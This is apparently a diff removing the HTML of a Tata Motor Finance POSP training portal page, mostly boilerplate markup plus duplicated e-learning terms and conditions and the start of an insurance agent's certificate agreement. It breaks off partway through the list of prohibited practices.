@@ -1,750 +1,336 @@
-
-
-
-<!DOCTYPE html>
-<html class="no-js" lang="en">
-    <head>
-        <title>TATA Capital Limited</title>
-                <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1" />
-        <!-- <meta http-equiv="refresh" content="1800;url=logout" /> -->
-        <!-- favicon -->
-        <link rel="shortcut icon" href="images/logo.png">
-        <link rel="apple-touch-icon" href="images/logo.png">
-        <link rel="apple-touch-icon" sizes="72x72" href="images/logo.png">
-        <link rel="apple-touch-icon" sizes="114x114" href="images/logo.png">
-
-        <style>
-          .ui-autocomplete {
-            z-index: 50;
-            margin-top: -20px;          
-            background-color: #fff;
-            min-width: 280px;
-            max-width: 240px;
-            list-style: none;
-            padding: 10px;
-            font-size: 15px;
-            border-radius: 5.6px;
-            max-height: 150px;
-            overflow: scroll;
-            }
-
-            .help-block{
-                font-weight: bold;
-            }
-
-            /*This is for chosen css*/
-            .chosen-container-single {
-            width:317px !important;
-            }
-
-            .chosen-single {
-            height: 31px !important;
-            }
-            /*This is for chosen end css*/
-
-            /* For Firefox */
-            input[type='number'] {
-                -moz-appearance:textfield;
-            }
-            /* Webkit browsers like Safari and Chrome */
-            input[type=number]::-webkit-inner-spin-button,
-            input[type=number]::-webkit-outer-spin-button {
-                -webkit-appearance: none;
-                margin: 0;
-            }
-        </style>
-        
-        
-
-<!-- Jquery Library -->
-<script src="https://posp.tmf.co.in/assets/js/jquery.min.js"></script>
-
-<!-- CSS Librarry --><link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/animate.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/bootstrap.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/bootstrap.min.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/bootstrap-extend.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/bootstrapvalidator.min.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/et-line-icons.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/font-awesome.min.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/extralayers.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/font-awesome.min.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/settings.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/magnific-popup.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/owl.carousel.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/owl.transitions.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/full-slider.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/text-effect.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/menu-hamburger.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/magnific-popup.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/flag-icon.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/flag-icon.min.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/style.css">
-<link rel="stylesheet" type="text/css"  href="https://posp.tmf.co.in/assets/css/responsive.css">
-
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/toastr/toastr.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/bootstrap-sweetalert/sweetalert.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-bs4/dataTables.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-select-bs4/dataTables.select.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-buttons-bs4/dataTables.buttons.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-rowgroup-bs4/dataTables.rowgroup.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-scroller-bs4/dataTables.scroller.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-responsive-bs4/dataTables.responsive.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-fixedheader-bs4/dataTables.fixedheader.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/library/datatables.net-fixedcolumns-bs4/dataTables.fixedcolumns.bootstrap4.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/css/font-awesome.min.css">
-<link rel="stylesheet" href="https://posp.tmf.co.in/assets/css/line-awesome.min.css">
-		<script type="text/javascript">
-		var SITEROOT = 'https://posp.tmf.co.in/';
-		var current_year = 2026;
-		var current_month = 04;
-		var current_day = 08;
-		var base_url = 'https://posp.tmf.co.in/';
-		var final_page = '';
-		var syllabus = '';
-		var customer_type_id = '';
-		var max_time = 54000;
-		var iLearn = 'https://posp.tmf.co.in/iLearn';
-		var pagenotfound = 'https://posp.tmf.co.in/pagenotfound';
-		var token_name = 'protections';
-		var token_value = '6a95a5da18efccce75f59985f466a212';</script>
-<script>
-    // this is important for IEs for popup sectipn only
-    var polyfilter_scriptpath = '/js/';
-
-//            https://developer.mozilla.org/en-US/docs/Web/API/Storage/LocalStorage
-//            https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API
-//            https://dzone.com/articles/how-store-values-html5-local
-//            https://stackoverflow.com/questions/23720988/how-to-filter-json-data-in-javascript-or-jquery
-
-</script>
-
-<!-- Crypto js -->
-<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
-<script src="'.$base_url.'assets/js/Encryption.js"></script> -->
-
- <link rel="stylesheet" type="text/css" href="https://posp.tmf.co.in/assets/css/jquery-ui.css">
- <script src="https://posp.tmf.co.in/assets/js/jquery-ui.js"></script>
- <script src="https://posp.tmf.co.in/assets/js/jquery-ui.min.js"></script>
- <script src="https://posp.tmf.co.in/assets/js/jquery-ui.css"></script>
- <script src="https://posp.tmf.co.in/assets/library/bootstrap-sweetalert/sweetalert.js"></script>
- <script src="https://posp.tmf.co.in/giib/global/js/Plugin/bootstrap-sweetalert.js"></script>
- <script src="https://posp.tmf.co.in/giib/assets/examples/js/advanced/bootbox-sweetalert.js"></script> 
-</head><body  class="page_page_front page_sub_page_sub_pos_agreement" >
- <!-- style="border-top: 4px solid #428bca;" -->
-<nav class="site-navbar navbar navbar-default navbar-fixed-top navbar-mega" role="navigation">
-    <div class="navbar-header col-md-3">
-      <button type="button" class="navbar-toggler hamburger hamburger-close navbar-toggler-left hided"
-      data-toggle="menubar">
-        <span class="sr-only">Toggle navigation</span>
-        <span class="hamburger-bar"></span>
-      </button>
-      <button type="button" class="navbar-toggler collapsed" data-target="#site-navbar-collapse"
-      data-toggle="collapse">
-        <i class="icon wb-more-horizontal fa fa-bars" aria-hidden="true"></i>
-      </button>
-      <div class="navbar-brand navbar-brand-center site-gridmenu-toggle" data-toggle="gridmenu" style="left :31%;">
-
-        <img alt="" src="images/logo_tmf.png" class="logo" />
-
-        <span class="navbar-brand-text hidden-xs-down"> </span>
-      </div>      
-    </div>
-    
-    <div class="navbar-container container-fluid col-md-9">
-<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit" type="text/javascript">
-  
-  function googleTranslateElementInit() {
-  new google.translate.TranslateElement({ pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE, autoDisplay: false }, 'google_translate_element');
-}
- 
-</script>
-<div id="google_translate_element"></div>
-      <!-- Navbar Collapse -->
-      <div class="collapse navbar-collapse" id="site-navbar-collapse">
-        <!-- Navbar Toolbar Right -->
-        <ul class="nav navbar-toolbar navbar-right navbar-toolbar-right">
-		
-          
-          <li class="nav-item assesment_link" style="display:none;">
-            <a class="nav-link blink_me" href="https://posp.tmf.co.in/assesment" data-animation="scale-up"
-            aria-expanded="false" role="button"><b>ASSESMENT</b></a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link" href="https://posp.tmf.co.in/logout" data-animation="scale-up"
-            aria-expanded="false" role="button"><b>LOGOUT</b></a>
-          </li>
-      </div>
-      <!-- End Navbar Collapse -->
-    </div>
-  </nav>
-
-<div id="result-popup" class="modal fade col-lg-4 col-md-6 col-sm-7 col-xs-11 center-col text-center margin-seven">
-    <div class="row" id="otp_div">
-        <div class="col-md-12 center-col login-box">
-            <img alt="" src="images/logo_tmf.png" class="logo" /> <br><br>
-            <h2></h2>
-            <h3></h3>
-            <div class=" bg-black no-margin-lr margin-five center-col" ></div>
-                <div class="row" >
-                    <div class="col-md-12">
-                        <div class="form-group no-margin-bottom text-left">
-                        </div>
-                    </div>
-                </div>
-
-                <div class="clear-both"></div>
-                <!-- <a href="https://posp.tmf.co.in/download_certificate/" class="btn btn-black no-margin-bottom btn-small btn-round no-margin" name="download_certificate" id="download_certificate" type="button">DOWNLOAD CERTIFICATE</a> -->
-            </div>
-    </div>
-</div>
-
-<div id="retest-popup" class="modal fade col-lg-4 col-md-6 col-sm-7 col-xs-11 center-col text-center margin-seven">
-    <div class="row" id="otp_div">
-        <div class="col-md-12 center-col login-box">
-            <img alt="" src="images/logo_tmf.png" class="logo" /> <br><br>
-            <h2></h2>
-            <h3></h3>
-            <div class=" bg-black no-margin-lr margin-five center-col" ></div>
-                <div class="row" >
-                    <div class="col-md-12">
-                        <div class="form-group no-margin-bottom text-left">
-                        </div>
-                    </div>
-                </div>
-
-                <div class="clear-both"></div>
-                <a href="https://posp.tmf.co.in/retest" class="btn btn-black no-margin-bottom btn-small btn-round no-margin" name="download_certificate" id="download_certificate" type="button"></a> <br><br>
-                <a href="https://posp.tmf.co.in/iLearn" class="btn btn-black no-margin-bottom btn-small btn-round no-margin" name="download_certificate" id="download_certificate" type="button"></a>
-              </div>
-    </div>
-</div>
-
-<div id="learning_terms1" class="modal fade col-lg-4 col-md-6 col-sm-7 col-xs-11 center-col text-center margin-seven" style="width: 72.333333%;">
-    <div class="row" id="otp_div">
-        <div class="col-md-12 center-col login-box modal-body">
-            <img alt="" src="images/logo_tmf.png" class="logo" /> <br><br>
-            <h3></h3>
-            <div class=" bg-black no-margin-lr margin-five center-col" ></div>
-                <div class="row" >
-                    <div class="col-md-12">
-                        <div class="form-group no-margin-bottom text-left">
-                          <p style="line-height: 20px; color: black; font-size:14px;">This is a contract with <b style="font-weight:bold;">TATA MotorFinance,</b> whose registered office is at <b style="font-weight:bold;">  9th Floor, A & B Wing, Fulcrum Building, Sahar Road, Andheri(East),Mumbai 400099  (hereinafter referred to as "TMF") </b>. Please carefully read the following terms before accessing this training site or using a course available therein (hereinafter referred to as “Site”). By accessing the Site (which includes, visiting, registering, purchasing or accessing a course) you accept and agree to all of the covenants and conditions imposed herein (henceforth referred to as “Terms”). If you do not agree to these Terms, you may not access the Site.</p>
-                          <p style="line-height: 20px; color: black; font-size:14px;">By using this service, you agree that you have read, understand and agree to these Terms. You also agree to review this agreement periodically to be aware of modifications to the agreement, which modifications goodelearning.com may make at any time. Your continued use of this Site will be deemed your conclusive acceptance of any modified agreement.</p>
-                          <b style="font-weight:bold;color: black;">1. General </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>1.1     TMF reserves the right to change the content used at any time. </li>
-                            <li>1.2     Trainees who fail to complete the e-learning course in the time available will not be eligible for a refund.</li>
-                            <li>1.3     Learner will receive an electronic notification through SMS/registered email.</li>
-                            <li>1.4     All rights not expressly granted herein are reserved.</li>
-                            <li>1.5     These Terms shall be governed by and construed in accordance with the laws of India.</li>
-                            <li>1.6     If you do not agree with these Terms you must cease the course immediately and notify TMF of your intent not to continue</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;"> 2. E-Learning Materials </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>2.1   The training material is property of TMF.</li>
-                            <li>2.2   This training material has been prepared, maintained, updated and distributed by TMF.</li>
-                            <li>2.3   The use of the training material on our courses is restricted to the registered user who has been supplied with the log in details by TMF as part of an authorised course.</li>
-                            <li>2.4   The Registered User shall not copy, share, modify, transmit, distribute, or in any way, exploit the copyrighted materials provided by TMF other than for their own individual training. Use for any other purpose is expressly prohibited by TMF and any violators will be prosecuted.</li>
-                            <li>2.5   The Registered User shall not permit anyone else to copy, use, modify, transmit, distribute, or in any way, exploit the copyrighted materials.</li>
-                            <li>2.6   The materials made available by TMF are provided "as-is" without warranties of any kind, either expressed, or implied, including, but not limited to, all implied warranties of merchantability, fitness for a particular purpose, title or non-infringement.</li>
-                            <li>2.7   TMF does not warrant that the materials will be error free including technical inaccuracies, nor free of viruses, or other harmful matter. The entire cost of any necessary service, repair, or correction, is the Registered User's responsibility.</li>
-                            <li>2.8   TMF may make improvements, or changes, to this material at any time without prior notification.</li>
-                            <li>2.9   Any unauthorised use of training material is prohibited.</li>
-                            <li>2.10  All rights not expressly granted herein are reserved.</li>  
-                            <li>2.11  If you do not agree with these Terms you must cease to use this e-learning immediately.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;">  3. Training Certificate  </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>3.1    TMF will only issue certificate for POSP who has satisfactorily completed a training course if the trainee has provided the required personal information and completed training hours.</li>
-                            <li>3.2   Without exception, TMF will provide certificate for course once all necessary documents are received.</li>
-                            <li>3.3   The training will be of 15 hours.</li>
-                            <li>3.4   Exams are owned by TMF and thus one must adhere to TMF Terms and conditions for examination.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;">   4. Access to the Courses  </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>4.1    TMF strives to provide the course content to its registered users. To that end, TMF does not take any responsibility to provide uninterrupted access of the courses to its registered users. However, from time to time, user may be unable to access the courses due to conditions beyond TMF's control. Such conditions include, but are not limited to: force majeure, acts of God, power outages, and the acts of computer hackers and others acting outside the law. Also, from time to time, access may be unavailable due to software issues, server downtime, increased Internet traffic or downtime, programming errors, regular maintenance of the system, and other related reasons. In response to any unavailability of the courses to its users, TMF will not take any commercial responsibility to ensure access is restored within any period of time. The term "commercial responsibility," as used in these Terms, shall mean any remuneration to restore the access of the training course or expenditure made by user by him/herself of time, resources, personnel or money. </li>
-                            <li>4.2   TMF endeavors to provide the highest quality content to its users. To that end, TMF reserves the right, in its sole discretion, to change, modify, or discontinue any aspect or feature of this Site in whole or in part, including, without limitation, the content, availability, access and/or the Terms of this site. Such changes, modifications, additions or deletions will be effective immediately upon notice thereof, which notice may be made by posting such changes on this Site.</li>
-                            <li>4.3   Users are solely responsible for ensuring that they have sufficient and compatible hardware, software, telecommunications equipment and Internet service necessary for use of the Site.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;">    5. Third Party Content; Hyperlinks   </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>5.1    TMF makes no warranty, either expressed or implied, of the accuracy, merchantability, fitness for a particular purpose, or non-infringement of the information provided by third parties. This includes, but is not limited to, any information found on a link located on this Site that allows users to access information found on another site. Additionally, TMF does not warrant the existence or functionality of any website which can be accessed through a link located on training material. </li>                          
-                          </ul><br>                          
-
-                          <b style="font-weight:bold;color: black;">    6. Copyrights, Trademarks and Other Proprietary Rights   </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>6.1   TMF shall retain all worldwide rights in the intellectual property in and on the Site, including, but not limited to, trademarks, service marks, trade dress, inventions, ideas, trade secrets, the source code, the HTML code, the "look and feel" of the Site, its colour combinations, layout, and all other graphical elements, and the copyrights in and to its original content. You should assume that everything you read or see on the Site is copyrighted, trademarked, or otherwise protected and owned or licensed by TMF.</li>                          
-                            <li>6.2  Except as expressly stated on the Site or in these Terms, nothing that you read or see on the Site or in the courses may be copied, reproduced, modified, distributed, transmitted, republished, displayed or performed for commercial use without the prior written consent of TMF, except as provided in these Terms. Nothing in these Terms grants you an express or implied license to use any of TMF intellectual property.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;">    7. Disclaimers and Limitation of Liability    </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>7.1    Users access this Site at his/her/its own risk. The Site is provided on an "as is, as available" basis without warranty of any kind, expressed, implied or statutory, and any and all warranties of merchantability, fitness for a particular purpose or non-infringement of third parties' rights are specifically disclaimed. TMF does not warrant any particular result from use of the software or Site. TMF does not warrant that the information on the Site is accurate, complete or complies with any particular law or regulation, or that the operation of and your access to the Site will be uninterrupted, error-free, virus-free or completely secure. </li>                          
-                            <li>7.2  Under no circumstances and under no legal theory (tort, contract or otherwise) shall TMF or any of its affiliates, agents, employees, shareholders, directors, officers, third party content providers, successors or assigns be liable to you or any other person or entity for any indirect, special, incidental, punitive or consequential damages of any character, including without limitation, damages for loss of goodwill, work stoppage, computer failure or malfunction, loss of data, loss of productivity or contract, or any and all other commercial damages or losses.</li>
-                            <li>7.3   Your use of this Site is at your sole risk and any content that you download is downloaded at your own discretion and risk, and you are solely responsible for any damage to your computer system in excess of the amount TMF received from registered users for a course, and for any loss of data that results from the downloading of any such content, including any damages resulting from computer viruses.</li>
-                            <li>7.4  In no event will TMF be liable for any damages for the users while access to a course, even if TMF have been informed of the possibility of such damages, or for any claim by any other party.</li>
-                            <li>7.5  In no event will warranties provided by law, if any, apply unless they are required to apply by statute notwithstanding their exclusion by contract.</li>
-                            <li>7.6   This disclaimer is applicable to any damage or injury resulting from the negligence or an omission of TMF, computer virus or other similar item, telecommunications errors, or unauthorized access to or use of user information through theft or any other means. TMF is not liable for criminal, tortious, or negligent actions or omissions of third parties that affect this site.</li>
-                          </ul><br>                                                                              
-
-                        </div>
-                    </div>
-                </div>
-
-                <div class="clear-both"></div>
-                <button class="btn btn-black no-margin-bottom btn-small btn-round no-margin" type="button" data-dismiss="modal">I agree</button>
-            </div>
-    </div>
-</div>
-
-<!-- Modal -->
-<div class="modal fade" id="learning_terms" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-lg">
-    <div class="modal-content">
-      
-      <div class="modal-body">
-        <br><br>
-      <img alt="" src="images/logo_tmf.png" class="logo" style="display:block;margin-left:auto;margin-right:auto;width:40%" /> <br><br>
-            <h3></h3>
-      <p style="line-height: 20px; color: black; font-size:14px;">This is a contract with <b style="font-weight:bold;">TATA MotorFinance,</b> whose registered office is at <b style="font-weight:bold;"> CORPORATE CENTRE PREMISES CSL, 202, 2ND FLOOR, ANDHERI KURLA ROAD, ANDHERI (EAST)- 400059, MUMBAI, MAHARASHTRA.   (hereinafter referred to as "TMF") </b>. Please carefully read the following terms before accessing this training site or using a course available therein (hereinafter referred to as “Site”). By accessing the Site (which includes, visiting, registering, purchasing or accessing a course) you accept and agree to all of the covenants and conditions imposed herein (henceforth referred to as “Terms”). If you do not agree to these Terms, you may not access the Site.</p>
-                          <p style="line-height: 20px; color: black; font-size:14px;">By using this service, you agree that you have read, understand and agree to these Terms. You also agree to review this agreement periodically to be aware of modifications to the agreement, which modifications goodelearning.com may make at any time. Your continued use of this Site will be deemed your conclusive acceptance of any modified agreement.</p>
-                          <b style="font-weight:bold;color: black;">1. General </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>1.1     TMF reserves the right to change the content used at any time. </li>
-                            <li>1.2     Trainees who fail to complete the e-learning course in the time available will not be eligible for a refund.</li>
-                            <li>1.3     Learner will receive an electronic notification through SMS/registered email.</li>
-                            <li>1.4     All rights not expressly granted herein are reserved.</li>
-                            <li>1.5     These Terms shall be governed by and construed in accordance with the laws of India.</li>
-                            <li>1.6     If you do not agree with these Terms you must cease the course immediately and notify TMF of your intent not to continue</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;"> 2. E-Learning Materials </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>2.1   The training material is property of TMF.</li>
-                            <li>2.2   This training material has been prepared, maintained, updated and distributed by TMF.</li>
-                            <li>2.3   The use of the training material on our courses is restricted to the registered user who has been supplied with the log in details by TMF as part of an authorised course.</li>
-                            <li>2.4   The Registered User shall not copy, share, modify, transmit, distribute, or in any way, exploit the copyrighted materials provided by TMF other than for their own individual training. Use for any other purpose is expressly prohibited by TMF and any violators will be prosecuted.</li>
-                            <li>2.5   The Registered User shall not permit anyone else to copy, use, modify, transmit, distribute, or in any way, exploit the copyrighted materials.</li>
-                            <li>2.6   The materials made available by TMF are provided "as-is" without warranties of any kind, either expressed, or implied, including, but not limited to, all implied warranties of merchantability, fitness for a particular purpose, title or non-infringement.</li>
-                            <li>2.7   TMF does not warrant that the materials will be error free including technical inaccuracies, nor free of viruses, or other harmful matter. The entire cost of any necessary service, repair, or correction, is the Registered User's responsibility.</li>
-                            <li>2.8   TMF may make improvements, or changes, to this material at any time without prior notification.</li>
-                            <li>2.9   Any unauthorised use of training material is prohibited.</li>
-                            <li>2.10  All rights not expressly granted herein are reserved.</li>  
-                            <li>2.11  If you do not agree with these Terms you must cease to use this e-learning immediately.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;"> 3. Training Certificate  </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>3.1   TMF will only issue certificate for POSP who has satisfactorily completed a training course if the trainee has provided the required personal information and completed training hours.</li>
-                            <li>3.2   Without exception, TMF will provide certificate for course once all necessary documents are received.</li>
-                            <li>3.3   The training will be of 15 hours.</li>
-                            <li>3.4   Exams are owned by TMF and thus one must adhere to TMF Terms and conditions for examination.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;">   4. Access to the Courses  </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>4.1   TMF strives to provide the course content to its registered users. To that end, TMF does not take any responsibility to provide uninterrupted access of the courses to its registered users. However, from time to time, user may be unable to access the courses due to conditions beyond TMF's control. Such conditions include, but are not limited to: force majeure, acts of God, power outages, and the acts of computer hackers and others acting outside the law. Also, from time to time, access may be unavailable due to software issues, server downtime, increased Internet traffic or downtime, programming errors, regular maintenance of the system, and other related reasons. In response to any unavailability of the courses to its users, TMF will not take any commercial responsibility to ensure access is restored within any period of time. The term "commercial responsibility," as used in these Terms, shall mean any remuneration to restore the access of the training course or expenditure made by user by him/herself of time, resources, personnel or money. </li>
-                            <li>4.2   TMF endeavors to provide the highest quality content to its users. To that end, TMF reserves the right, in its sole discretion, to change, modify, or discontinue any aspect or feature of this Site in whole or in part, including, without limitation, the content, availability, access and/or the Terms of this site. Such changes, modifications, additions or deletions will be effective immediately upon notice thereof, which notice may be made by posting such changes on this Site.</li>
-                            <li>4.3   Users are solely responsible for ensuring that they have sufficient and compatible hardware, software, telecommunications equipment and Internet service necessary for use of the Site.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;">    5. Third Party Content; Hyperlinks   </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>5.1    TMF makes no warranty, either expressed or implied, of the accuracy, merchantability, fitness for a particular purpose, or non-infringement of the information provided by third parties. This includes, but is not limited to, any information found on a link located on this Site that allows users to access information found on another site. Additionally, TMF does not warrant the existence or functionality of any website which can be accessed through a link located on training material. </li>                          
-                          </ul><br>                          
-
-                          <b style="font-weight:bold;color: black;">    6. Copyrights, Trademarks and Other Proprietary Rights   </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>6.1   TMF shall retain all worldwide rights in the intellectual property in and on the Site, including, but not limited to, trademarks, service marks, trade dress, inventions, ideas, trade secrets, the source code, the HTML code, the "look and feel" of the Site, its colour combinations, layout, and all other graphical elements, and the copyrights in and to its original content. You should assume that everything you read or see on the Site is copyrighted, trademarked, or otherwise protected and owned or licensed by TMF.</li>                          
-                            <li>6.2  Except as expressly stated on the Site or in these Terms, nothing that you read or see on the Site or in the courses may be copied, reproduced, modified, distributed, transmitted, republished, displayed or performed for commercial use without the prior written consent of TMF, except as provided in these Terms. Nothing in these Terms grants you an express or implied license to use any of TMF intellectual property.</li>
-                          </ul><br>
-
-                          <b style="font-weight:bold;color: black;">    7. Disclaimers and Limitation of Liability    </b>
-                          <ul style="margin-left: 10px; line-height: 20px; color: black; font-size:14px;">
-                            <li>7.1    Users access this Site at his/her/its own risk. The Site is provided on an "as is, as available" basis without warranty of any kind, expressed, implied or statutory, and any and all warranties of merchantability, fitness for a particular purpose or non-infringement of third parties' rights are specifically disclaimed. TMF does not warrant any particular result from use of the software or Site. TMF does not warrant that the information on the Site is accurate, complete or complies with any particular law or regulation, or that the operation of and your access to the Site will be uninterrupted, error-free, virus-free or completely secure. </li>                          
-                            <li>7.2  Under no circumstances and under no legal theory (tort, contract or otherwise) shall TMF or any of its affiliates, agents, employees, shareholders, directors, officers, third party content providers, successors or assigns be liable to you or any other person or entity for any indirect, special, incidental, punitive or consequential damages of any character, including without limitation, damages for loss of goodwill, work stoppage, computer failure or malfunction, loss of data, loss of productivity or contract, or any and all other commercial damages or losses.</li>
-                            <li>7.3   Your use of this Site is at your sole risk and any content that you download is downloaded at your own discretion and risk, and you are solely responsible for any damage to your computer system in excess of the amount TMF received from registered users for a course, and for any loss of data that results from the downloading of any such content, including any damages resulting from computer viruses.</li>
-                            <li>7.4  In no event will TMF be liable for any damages for the users while access to a course, even if TMF have been informed of the possibility of such damages, or for any claim by any other party.</li>
-                            <li>7.5  In no event will warranties provided by law, if any, apply unless they are required to apply by statute notwithstanding their exclusion by contract.</li>
-                            <li>7.6   This disclaimer is applicable to any damage or injury resulting from the negligence or an omission of TMF, computer virus or other similar item, telecommunications errors, or unauthorized access to or use of user information through theft or any other means. TMF is not liable for criminal, tortious, or negligent actions or omissions of third parties that affect this site.</li>
-                          </ul><br>         </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-        <button class="btn btn-black no-margin-bottom btn-small btn-round no-margin" type="button" data-bs-dismiss="modal">I agree</button>
-
-      </div>
-    </div>
-  </div>
-</div>
-
-
-<div id="exam_terms" class="modal fade"  tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
-    <div class="modal-dialog" role="document">
-        <div class="modal-content">
-            <img alt="" src="images/logo_tmf.png" class="logo" /> <br><br>
-            <h3></h3>
-            <div class=" bg-black no-margin-lr margin-five center-col" ></div>
-                <div class="row" >
-                    <div class="col-md-12">
-                        <div class="form-group no-margin-bottom text-left">
-                          <p style="line-height: 20px; color: black; font-size:14px;">Congratulations on your successful training and assessment conducted by <b style="font-weight:bold;">TATA MotorFinance</b>. Before you download the completion certificate, you must read and accept all the below mentioned terms and conditions (T&C). We strongly recommend you to read this T&C. Validity of your POSP Certificate is effective only upon your acceptance of this T&C. If you do not agree to be bound by this T&C, you may not download the POSP certificate and stop using this assessment site immediately. We at TATA MotorFinance CO LTD Limited reserve the right, at any time, at our sole discretion, to change or otherwise modify the T&C, without prior notice, and your continued access or use of this site signifies your acceptance of the updated or modified T&C.</p>
-                          
-                          <ol type="1" style="line-height: 20px; color: black; font-size:14px;">
-                            <li>All the details and information provided during online registration form by me as a registered POSP is true and correct to best of my knowledge, and TATA MotorFinance CO LTD reserves the right to terminate me, without any notice or explanation as Point of Sale Person (POSP), if any of these details and/or information as provided by me found to be incorrect at any point of time.</li>
-                            <li>I have successfully completed the training and all the assessments of POSP conducted by TATA MotorFinance CO LTD Limited by myself, and I have gained required knowledge and understanding of the subject to sell POSP insurance products through TATA MotorFinance CO LTD.</li>
-                            <li>I hereby, -agree to do the following (the DO’S) :-
-                              <ul>
-                                <li>3.1 Conduct my dealing with customers with utmost good faith, integrity, care and diligence at all times.</li>
-                                <li>3.2 Ensure that the customers understand the type of services we are offering and to assure that the proposed policy is suitable to the requirement  of the prospective customer.</li>
-                                <li>3.3 Solicit and sell only those line of products which are approved by Insurance Regulatory and Development Authority of India (IRDAI) and are authorized to sell under POS or other applicable IRDAI guidelines.</li>
-                                <li>3.4 Solicit and sell only those products which are authorized to me by TATA MotorFinance CO LTD Limited under its insurance programme as may be informed in writing from time to time.</li>
-                                <li>3.5 Sell only those products which  are available on TATA MotorFinance CO LTD Limited’s online portal, access of which shall be shared by Airtel Payment Bank Limited with you.</li>
-                                <li>3.6 Obtain written consent from the customer to represent the customer to the insurer.</li>
-                                <li>3.7 Explain why a policy or policies are proposed and provide a product comparison in terms of price, cover or service where there is a choice of products and solicit products which are pre-underwritten as approved by IRDAI.</li>
-                                <li>3.8 Explain to the customer when and how the premium is payable and how much premium is to be collected.</li>
-                                <li>3.9 Inform the customer in writing of the insurance premium and any applicable fees or charges separately and the purpose of any related services.</li>
-                                <li>3.10 Inform the customer about the acceptance or rejection of the proposal by the insurer.</li>
-                                <li>3.11 Keep the information received from the customer confidential and to take necessary steps to maintain security of the confidential documents in their possession.</li>
-                                <li>3.12 Render necessary assistance to the customer, policyholder,claimants or beneficiaries in complying with the requirements for settlement of valid claim by the insurer.</li>
-                                <li>3.13 Abide by all the applicable laws and regulations and rules and procedures of the insurer or intermediary.</li>
-                              </ul>                              
-                            </li>
-
-                            <li>I hereby agree to not do the following (the DONT’S):
-                              <ul>
-                                <li>4.1 Sell products which are not approved under POS guidelines.</li>
